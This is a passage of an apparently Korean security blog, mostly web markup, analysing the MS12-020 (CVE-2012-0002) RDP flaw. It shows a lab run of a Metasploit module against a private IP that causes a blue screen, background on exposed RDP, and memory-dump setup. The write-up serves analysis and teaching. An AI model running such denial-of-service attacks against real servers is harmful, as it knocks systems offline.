decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">※ T<span class=\"token punctuation\">.</span><span class=\"token number\">125</span><span class=\"token punctuation\">:</span> 원격 회의<span class=\"token punctuation\">,</span> 화상 회의 및 컴퓨터 지원 공동 작업을 위한 지점 간\n통신 프로토콜 모음이며 애플리케이션 공유<span class=\"token punctuation\">,</span> 온라인 채팅<span class=\"token punctuation\">,</span> 파일 공유 및 기타\n기능 제공</code></pre></div>\n<h2 id=\"모듈-옵션-설정\" style=\"position:relative;\"><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\" aria-label=\"모듈 옵션 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>모듈 옵션 설정</h2>\n<p><img src=\"./image14.png\" alt=\"\"></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token builtin\">set</span> RHOST <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>\n\nshow options</code></pre></div>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<p>대상 서버를 대상으로 MS12-020 취약점 모듈을 실행한 결과 분석된 결과와\n동일하게 BSOD가 발생한 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAaklEQVQI113G2w5EMBAAUH+DemCrJZtopy41M5ZoV/z/r0h4k5yHk7TfHTlMPiD/DfBMcZoD8tGP6287iY/OklRQa/eQCippagWiaBNtFqToKXqM1t3H4IbVuqUfN6mg/HSZaNJcv2SiuQBZxRzj8DNm0wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image15\"\n        title=\"image15\"\n        src=\"/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png\"\n        srcset=\"/static/166a87a3e754290df73519dbb1b26e6b/e9ff0/image15.png 180w,\n/static/166a87a3e754290df73519dbb1b26e6b/f21e7/image15.png 360w,\n/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">exploit  \\#run 명령을 사용해도 된다<span class=\"token punctuation\">.</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 349px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACZUlEQVQoz2VS2WrbUBC9tvZ9uVotOZJtbAcZP+Qlf9WnNIU2NIt26WpzHIfSr22vnIAhcBjODBzOcGaA4+SWlUnSM8M8ctwTyz6R5G8Afn3Bw2c9k0cAvgHDaBSlVtV6Nutdt3Pd3rJals0FoeT5gudLQag4DhNRrCaTBIAEgBiAHIB7sFwefL/zvNayGtNEgpBDWKtq6Tit4zSWhRwHz3W9siwEwPMnMgC+gyAYTBO5bifLpapWENaaVkNYK0olSYVlIUWpRLGw7UZVK12vXbcRhPxD7Hmd67ZXV8NicVgsDmE4BMEQhpi7bqvrtWEgQSgMA0FY6zqGLJfTaQ7AHbBttFq9el7nOG0YDr7fr9dHy0Ij70wT+X5n200Q9KNHHwQDQcQApNh5s3ndbI77/XsYDovFEIbDen0Mw2G7Pa5W2H+7PS6Xw37/flZeX78xTPohns3wbpbV2HYrisV0Go95vHzWr3gG4GnM/A6YJrLtxjDQfI4XU9VKUUpNw9moaiXLpaZhoml4PrbVeI5GFH9iseM0tt34fjc6JwyTjchpOqOojGVzlsWVplOKShkm47iMYUqSvAcclzNMCmHN8zlFpRAiUSxkuYQQnc0lqeT5/DJwQcgUBWnaA5AkfF6aziaTeDKJCSIZ3yimqPQMkkwIIiHJlKbTs/nYFhT1A3hea9vI9/v5vNf12jTR1VXvOO10mlyEFH+JLcWB3d7+jaLTzc2fKHqLorfd7rTbnaLopGkVQSQXyvgCLx8ftl7jDwnDw3zeL5eH1er1vAKEtSSVYy1UFX+oouDAJanQtEoQ6v/O/wDsuMJS+tZU8wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image16\"\n        title=\"image16\"\n        src=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png\"\n        srcset=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9ff0/image16.png 180w,\n/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png 349w\"\n        sizes=\"(max-width: 349px) 100vw, 349px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"분석-개요\" style=\"position:relative;\"><a href=\"#%EB%B6%84%EC%84%9D-%EA%B0%9C%EC%9A%94\" aria-label=\"분석 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>분석 개요</h1>\n<h2 id=\"취약점-분석-배경\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\" aria-label=\"취약점 분석 배경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 배경</h2>\n<p>외부망에 노출되어 있는 RDP 프로토콜은 해킹을 통해 시스템을 완전히 제어가\n가능하기 때문에 대상 목록상 우선이 되곤 한다. 또한 공격자가 정상적인\n프로토콜을 통해 시스템에 접속을 하기 때문에 보안 관리자가 악의적인\n활동을 탐지하기 어렵다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABUklEQVQY04WQO0/CUACF+9ekYEyhtBCktSkNmgBVEl/hJzg5MOnvIGHQgUE3ExIpt9CWAsYYHsojMtDy6G17TVti3Dw5w1m+4XwY+hvX3Q3HQQiZ3Y6U3FfFjFLgtYtcK3vYIPekRESiw0Ex17YtY2lMp5vBwNmsHQitxbc1nyHX9eBEuCWk2idsk4kGQCMekjlKKfDN1AHmQDipPb7dldfjkTEeD6qV99ubj/vyZjYxe7qUiCh5Xi8V2zlOovEABkdk51oEaQJDCNmr1VftYT2fLXr65/PTsFqZ1l8QQoau+XBGO8+pogDYmEThEoUDhtBLp4CNYcFPyzQWr3VomsZoiBBa9rsOhGZfl+iwIgqqmJF5WhaS3uF4CDBR7TLvw4EgCO3t9leb429fWEQtHqtnWZmjABPzblN4M010rkTAkti/tkGaACwpc/QO9uvt5P4PkEkrvsSkMJcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image17\"\n        title=\"image17\"\n        src=\"/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png\"\n        srcset=\"/static/7e9e0942781196febe56538f7eac7f0e/e9ff0/image17.png 180w,\n/static/7e9e0942781196febe56538f7eac7f0e/f21e7/image17.png 360w,\n/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>국가별 빈도</p>\n<p>출처: <a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></p>\n<p>특히 최근에는 원격 화상회의 등 원격 업무 비율이 높아짐에 따라 RDP\n서비스를 사용하는 빈도율이 높아져 사이버 범죄에 노출 여부가 커지고 있다.\n동시에 기업 내에서는 RDP 서비스를 사용함에도 불구하고 인증 체계를\n사용하지 않거나 접근 통제를 실시하지 않는 등 업데이트를 크게 중요시하지\n않는 등 보안적으로 미흡이 되는 부분이 많다.</p>\n<p>이번 분석에서는 RDP 프로토콜을 통한 서비스 거부 공격에 쓰이는\nCVE-2012-0002를 분석할 것이다.</p>\n<h2 id=\"cve-2012-0002-취약점-요약\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\" aria-label=\"cve 2012 0002 취약점 요약 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 요약</h2>\n<p>2012년 3월 14일 마이크로소프트는 비공개적으로 보고된 CVE-2012-0002의\n원격 데스크톱 취약점을 패치하기 위해 MS12-020 긴급 업데이트를\n진행하였다. 원격 데스크톱은 사용자들에게 빈도성이 높은 프로토콜로\nExploit 코드가 공개될 시 악용될 위험성이 매우 놓은 취약점이다. RDP\n프로토콜은 데스크톱에 가상 세션을 만들어 이를 통해 사용자가 원격으로\n컴퓨터에 있는 모든 데이터와 애플리케이션에 접근할 수 있게 한다. 공격자가\nRDP의 취약점을 이용하면서 악성 코드를 설치하거나 프로그램을 삭제하는 등\n사용자의 시스템을 완전히 제어할 수 있다. 2012년 3월까지는 서비스 거부\n공격 코드만 공개되고 원격에서 실행 가능한 공격 코드는 알려지지 않았다.</p>\n<h1 id=\"bsod-메모리-덤프\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84\" aria-label=\"bsod 메모리 덤프 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프</h1>\n<h2 id=\"bsod-메모리-덤프-환경-설정\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\" aria-label=\"bsod 메모리 덤프 환경 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프 환경 설정</h2>\n<p><strong>1. 메모리 덤프 구성</strong></p>\n<p>BSOD 장애로 인한 메모리 덤프 저장을 하기 위해 설정을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACK0lEQVQoz3WPW2/SYACG+w/9Iyb+BaO33mg0cVE3XExcpjgTOR96/Hr6upbSAi20UE6lfNDC2MYYY+1nCHrhhW/e2yfP+xLZPH10kn317uLNh8zb43yuqgDY5GCTVyxRtUVtX7nWVgxHqXdKoiRoLdV0On2/ykrE7XqzXj9gjEdDT+BIReJUyOuq1LGMdku/WoYY4yRJ8J/EGD8mSYwxDsOIGNWaQb27m4WDvlvO/WTIPEsVGDIvgSrPlIJgfLPeTtAKhTfT6Ga+vLvdYZbiXrx8VgE8kWzvk4ctfoz9cV9kyxrkNMiqMisLFEsVFtHMst3zdCZXYvMVUKZFHuqZIvn0+ZPXH0+JOEkOq/yRxzPFS5lRIWfqslmTIE/OUNDrOkdHqZOTs+Pjs9Tp99Tnbwxgle4wmM6IJI4Pb/yRJ4HqpcSoMqsroKbyokCNRwPfH8gSA2VWllkFAijSzbqCMV6trvZwgvfm8dADdEHi9zyUaIOt6JUsQgHyXJhJN7iyTeZtgTLq0Gpom812EUUH8x6ejPsNXbRMaBlyy4QqXQTZH/M5Ct02/PRe/frFS593sxd1TWiZ6t3dwyJa/GOGPKWIQOIZwJA8IEWBQnOEHLuWPm/kMkORH1WKFqhYtoGT+Gq5JDabzW63wxhvt/cIoWAy9f3JxJ9Ng+j6epVgHLi2nrswy1mn+MumijW6YBp/P0fhdRSt8f+ziOa9Xrs/cD3XckTQ1hSv5xzg36k5LSPo+7jNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image18\"\n        title=\"image18\"\n        src=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png\"\n        srcset=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/e9ff0/image18.png 180w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/f21e7/image18.png 360w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 544px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1ElEQVQY02XNT0+DMBzGcV7Y+OM0GS5ut2UXjSdfLgdsWrofkJSSQoCWtgYL3oxboi775Ht98niH4+v9wy6Mtn4YX1oFGz+Ig+jRD+Pnl7fd/hhG27v1021ecyaESNMUY5xlWZIkhBBKKcZ4GAat9fhH/8/r+15K2bYtAFCaMcYATgDAOW+EkINclsU5N8+zc5/TtZ/nruvqun5H6ASQ5zlCiFJaFAXnnLGqqirGWFmWTdNa+2GM/c1TShljxnEkhFyWAEAI0VobY5RS1lpzNk3T17VvIfDpUxBvxrsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1\"\n        title=\"image 4 1\"\n        src=\"/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png\"\n        srcset=\"/static/d5411968270e22024f0986d60ab7df63/e9ff0/image-4.1.png 180w,\n/static/d5411968270e22024f0986d60ab7df63/f21e7/image-4.1.png 360w,\n/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png 544w\"\n        sizes=\"(max-width: 544px) 100vw, 544px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 메모리 덤프를 위한 디스크 할당</strong></p>\n<p>기존에 사용하던 디스크 대신 사후에 메모리 덤프 분석이 끝난 후 폐기를 할\n수 있도록 가상 하드 디스크를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC9UlEQVQ4y2VT227bRhBdGOhfFXD74AD9pP5QH4rGSCIhRRMbQRwgdRFbqSVHkiVKvIhL7iyXe+GSEiWbMwWF9qU+wHlazNkzM2dYUZZUqJK2zZaapsHD4YBPT0/U7vdDnmW1sZYOh0fsELHrOuoQXbPbDeLNhpRS3Xa7xf1+T33N4+MjsfhuTIZzqpuGkiTBoijQ1zU5gOF6PK5XkwllQYAQhijWIakwcmq5HGwm91Qq1Vlrsaoq6umcIza7m5A3hnoYY1Brjb0rm+fD4Ovf9fTmltaTewzuxhhNpySDwEEYDqLlkjKedQCAEmTvtq8nNntYYl032KP/rRe1zpL1fjCdzf1o9JVmsznGcYIAQKXWVnv/pig1qaLo+o6klFgqhc5aZG3bEiIe6XrbdU2Q56ST5I9CiFYIICklqbKk3nkchk0RRm8rY8g61znnsPIeXVVhkmyOguawP5i6rg1wboso8mI6q+zl5dBznjvvK61LI7LM8lW8zWfz1H34cGHTlIxzVJaK8pRTFsaUcU4sy7JzAXDu2/alBnhVRdF7p9RA7XY/8zz/xWj9qm3blyqH19ksuCiVOi+77ifTNN9X1v7ARX56+/7j6Zdfh6frxcMpEwCUJxuqAeiw31NHRH08tk3z+4bzVkhJxjqqt9vj22PX0a6uf/S7HdOFYlzkbHR5xW5+e8vCxYKx5WqN64cFptMpJlF0HHC/MUjTQXQ39mKxJAiCrgyjTkdxJ+ZzKtP0RRkETAN8JwBOvl3fnEzeXZ2EQXDCJje3+OXPa5zef8PlYolhGGKapiSzbGhyUVuQ5KBACxJ1LlBzThrgzAjBtBAn7P94uP6LJlefKBiN+lwhCIEAkqT3b4z3vt+scRZ7WuewNIZAFmdCSlYo9VxQFgWBlP8RTdNg2Lf5+fOF32wa5z31+fr3Io7u1+vwbD5/YHGcPBfs56W1PuaMRxEmFx8xG9+TmEzeiSBocgDinONqvsD59S2GqxUlPD1LeMriOH4m+A+hZ2EwIHbVVQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image19\"\n        title=\"image19\"\n        src=\"/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png\"\n        srcset=\"/static/63669029ee12f6255b1201df09d7b599/e9ff0/image19.png 180w,\n/static/63669029ee12f6255b1201df09d7b599/f21e7/image19.png 360w,\n/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABPUlEQVQoz33QXU+DMBQG4P4rhTkXDX7ExHil3vmTt2TL0mVAKaWEz7Y0hQIdROO4VPbkvT0n7zng9e3TWjg3t0/2zYNlO5btXNuOtXCurPvV3cv7x9di+bhcPf8bUJaMMY4xdl13s9ms12uMwziOwzD0ff94PGZZrnVb183fAKVUXddZlmKMPc9HCJVlKYRommYcx3EYhuFkZoCqqqSUlFKEkHuWJAnnXGs9DEPf9908IKVUSsVxHATBbrfzPC9N0zzPMcZTiwvzQAghpZxu3u/3EELGmBCCcz7tbeeB5iyKIkopIYRSmiQJQihN077vjTHDPKC1NsZkWUYphRAGQaCU4pwXRcEYO51O3/N+HyaEiKLI933P8yCEhJCqqowxXde1bavngbqutdaEEITQ4XDYbrdFUbRtOxUbL/oBjQMKWLFxuzgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 2\"\n        title=\"image 4 1 2\"\n        src=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png\"\n        srcset=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/e9ff0/image-4.1.2.png 180w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/f21e7/image-4.1.2.png 360w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 디스크 구성</strong></p>\n<p>가상 디스크를 할당한후 운영체제 환경에 디스크를 할당한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADD0lEQVQoz2WSPWwbZRzGX8PEwIrEZHYYMnRORNkqJD4nhCJBkRBj1QxdGAFB6AIiQNTaTZOKKk2gzZd7aeyzz3f33p3v673znS9xHNM29tlJbCfko019lwe5a57pmX7Po///IRe+voYfUvPICiZEPYj9ehvt3rEnKq5ckBgUsxrp7r9w1rejeniAJ62eXFQcLy87kPT12PAeg21so9bood7YASHvf4qbGQ6nhwfo7O3Gz0+OAcCr+obsmBICtxRVKyaqFSParJgIyrq86Wqer+Thq4W46mqoMRWbvgnf0UDIh6PxDC/FAOIX/Sg6GxjANQxJLPIcdLXQN4RczIq5vmNRWLYimlrRpWvLEFeXopLMxzYtxI4px4YmxIR8/BXuiPqgFV7CzoBnYasW0Lzl2grKtgLXpCjbKsoWhbbywKoo+ZrDFAwCXIuizFR4TIWtiyBjN9Jh0SyFB51mGG6tNxuB23kqC1KVz3Auoz2fKY2yTUMmrjVYgetZC3OrAf/QdJh6VLZoh5m0a+S5riU86mo03yUrs9mR67/Mjlz7aWbkux+nhn/9ff7ddF6/8NeiNLS6JF/87cbC8PcT8yM/X58ankzdvzgtGkPqlvMmK4lvMUNKqqqQXEtNJgsz6SSfyySJalbCSq0RBlvN8Gl7v7mzf9Jt7/UK7135dumdy1f2/7iXaRh2EJpebftJe/9gt3e0DIBQfpk4hkQ0TSDZ9CQp3LlF+FyGEEbzsOUcXE2AZ9GXt6g4pY03Pv9CI5c+wXRmFd1WiG63g2cnxzg+OtTHx8dfRdRNrPvsFaMkJop/303QhbmEKDxKEMotxgq3EAdrXFyXi5GrFmDbivvaZ5cl8tEoJuYe9Dc8L/7v8LB/evoce7s78sSf04nb03dJs9kg56TnOdDMfZSFLOquGfuDT/Kc//roNwr54EvcE7UIL07RPzuLBktot9o0fWsisbI4R1qt1nkg0yXYWhFGqQiVfxhr2RWwf2Y3plIpY+zmFDRmx3vtbdTLLHrsOahUXHrp7aHE1atjxNTVc8D/AYGhe/WlD7MGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image20\"\n        title=\"image20\"\n        src=\"/static/cedba1779661dda16537c68730284b83/32056/image20.png\"\n        srcset=\"/static/cedba1779661dda16537c68730284b83/e9ff0/image20.png 180w,\n/static/cedba1779661dda16537c68730284b83/f21e7/image20.png 360w,\n/static/cedba1779661dda16537c68730284b83/32056/image20.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: 